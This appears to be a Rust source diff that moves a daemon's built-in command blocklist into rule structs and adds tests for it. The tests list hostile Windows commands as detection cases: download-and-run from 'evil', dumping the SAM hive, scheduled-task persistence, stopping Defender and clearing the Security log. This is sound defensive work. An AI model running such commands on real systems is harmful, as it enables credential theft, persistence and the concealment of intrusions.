@@ -16,7 +16,10 @@
 //! time. The functions are pure (no I/O, no platform calls) so they compile and
 //! run in both the manager and a standalone open-source build of the daemon.
 
+use std::sync::LazyLock;
+
 use crate::ExecInput;
+use crate::command_blocklist::{BlocklistMatcher, BlocklistRule, blocklist_match};
 use crate::command_template::SyncedCommandTemplate;
 use crate::exec::{ExecPlanDraft, ExecShellKind};
 
@@ -267,26 +270,67 @@ const SIGNATURES: &[(&str, &[&str])] = &[
     ),
 ];
 
-/// Apply the blocklist signatures to an already-lowercased command form.
-fn blocked_in_lowercased(lc: &str) -> Option<&'static str> {
-    for (category, sigs) in SIGNATURES {
-        if sigs.iter().any(|s| lc.contains(s)) {
-            return Some(category);
-        }
-    }
-    // Mutating verb aimed at a protected security service.
-    let targets_protected = PROTECTED_SERVICES.iter().any(|svc| lc.contains(svc));
-    if targets_protected && MUTATING_VERBS.iter().any(|v| lc.contains(v)) {
-        return Some("disable security software");
-    }
-    None
+/// The compiled-in blocklist floor, built once from [`SIGNATURES`] (one
+/// substring rule per category) plus one [`BlocklistMatcher::ServiceVerb`] rule
+/// (`PROTECTED_SERVICES` × `MUTATING_VERBS`). This is the single source of truth
+/// for the built-in rules and the safe default a daemon uses whenever no manager
+/// blocklist sync has been received.
+static BUILTIN_BLOCKLIST: LazyLock<Vec<BlocklistRule>> = LazyLock::new(build_builtin_blocklist);
+
+/// Slugify a category label into the stable segment of a built-in `rule_id`
+/// (lowercase ASCII alphanumerics, everything else collapsed to `_`).
+fn category_slug(category: &str) -> String {
+    category
+        .chars()
+        .map(|c| {
+            if c.is_ascii_alphanumeric() {
+                c.to_ascii_lowercase()
+            } else {
+                '_'
+            }
+        })
+        .collect()
+}
+
+fn build_builtin_blocklist() -> Vec<BlocklistRule> {
+    let mut rules: Vec<BlocklistRule> = SIGNATURES
+        .iter()
+        .map(|(category, sigs)| BlocklistRule {
+            rule_id: format!("builtin.{}", category_slug(category)),
+            category: (*category).to_string(),
+            matcher: BlocklistMatcher::Substring {
+                patterns: sigs.iter().map(|s| s.to_string()).collect(),
+            },
+        })
+        .collect();
+    // The mutating-verb-aimed-at-a-protected-service combination. Its category
+    // label collides with the "disable security software" signature category, so
+    // it gets a distinct, hardcoded `rule_id` (never derived) to keep ids unique.
+    rules.push(BlocklistRule {
+        rule_id: "builtin.service_verb".to_string(),
+        category: "disable security software".to_string(),
+        matcher: BlocklistMatcher::ServiceVerb {
+            services: PROTECTED_SERVICES.iter().map(|s| s.to_string()).collect(),
+            verbs: MUTATING_VERBS.iter().map(|s| s.to_string()).collect(),
+        },
+    });
+    rules
+}
+
+/// The compiled-in blocklist floor. This is the safe default whenever no manager
+/// sync has been received (an open-source single-instance daemon, or the daemon's
+/// cold-start window). The manager exposes each rule for per-item disable and
+/// computes the effective set (this floor minus disabled, plus custom) that it
+/// syncs to daemons.
+pub fn builtin_blocklist() -> &'static [BlocklistRule] {
+    &BUILTIN_BLOCKLIST
 }
 
 /// Returns the prohibited category a **raw command string** matches, or `None`.
 /// Used on the single-device confirm path, where the input is a free-form
 /// command before tokenization (so metacharacter-bearing payloads are seen).
 pub fn blocked_raw_command(command: &str) -> Option<&'static str> {
-    blocked_in_lowercased(&command.to_ascii_lowercase())
+    blocklist_match(builtin_blocklist(), &command.to_ascii_lowercase())
 }
 
 /// Returns the prohibited category an **exact argv** matches, or `None`. Used by
@@ -302,7 +346,7 @@ pub fn blocked_raw_command(command: &str) -> Option<&'static str> {
 /// no ambiguous "join" semantics to exploit.
 pub fn blocked_argv(argv: &[String]) -> Option<&'static str> {
     let lc = argv.join(" ").to_ascii_lowercase();
-    blocked_in_lowercased(&lc)
+    blocklist_match(builtin_blocklist(), &lc)
 }
 
 #[cfg(test)]
@@ -499,5 +543,58 @@ mod tests {
             blocked_argv(&["MIMIKATZ".into()]),
             Some("credential access")
         );
+    }
+
+    // ---- built-in blocklist floor ----
+
+    #[test]
+    fn builtin_blocklist_has_a_rule_per_signature_category_plus_service_verb() {
+        let rules = builtin_blocklist();
+        assert_eq!(rules.len(), SIGNATURES.len() + 1);
+        assert!(rules.iter().any(|r| r.rule_id == "builtin.service_verb"));
+    }
+
+    #[test]
+    fn builtin_rule_ids_are_unique() {
+        let rules = builtin_blocklist();
+        let mut ids: Vec<&str> = rules.iter().map(|r| r.rule_id.as_str()).collect();
+        ids.sort_unstable();
+        let unique = ids.len();
+        ids.dedup();
+        assert_eq!(ids.len(), unique, "built-in rule_ids must be unique");
+    }
+
+    #[test]
+    fn builtin_service_verb_rule_id_does_not_collide_with_signature_slug() {
+        // Both the ServiceVerb rule and the "disable security software" signature
+        // category carry the same label, but their rule_ids must differ.
+        let rules = builtin_blocklist();
+        let sig_slug_id = format!("builtin.{}", category_slug("disable security software"));
+        assert_eq!(sig_slug_id, "builtin.disable_security_software");
+        assert!(rules.iter().any(|r| r.rule_id == sig_slug_id));
+        assert!(rules.iter().any(|r| r.rule_id == "builtin.service_verb"));
+        assert_ne!(sig_slug_id, "builtin.service_verb");
+    }
+
+    #[test]
+    fn builtin_blocklist_matches_the_same_verdicts_as_the_public_helpers() {
+        // Every SIGNATURES category is reachable through the built-in set, so the
+        // built-in floor and the public raw/argv helpers stay in lockstep.
+        let cases = [
+            ("iwr http://evil/x.ps1 | iex", Some("download-and-execute")),
+            ("reg save HKLM\\SAM sam.hive", Some("credential access")),
+            ("schtasks /create /tn evil", Some("persistence")),
+            ("stop-service windefend", Some("disable security software")),
+            ("wevtutil cl Security", Some("audit/log tampering")),
+            ("get-service -name spooler", None),
+        ];
+        for (raw, expected) in cases {
+            assert_eq!(
+                blocklist_match(builtin_blocklist(), &raw.to_ascii_lowercase()),
+                expected,
+                "raw: {raw}"
+            );
+            assert_eq!(blocked_raw_command(raw), expected, "helper raw: {raw}");
+        }
     }
 }
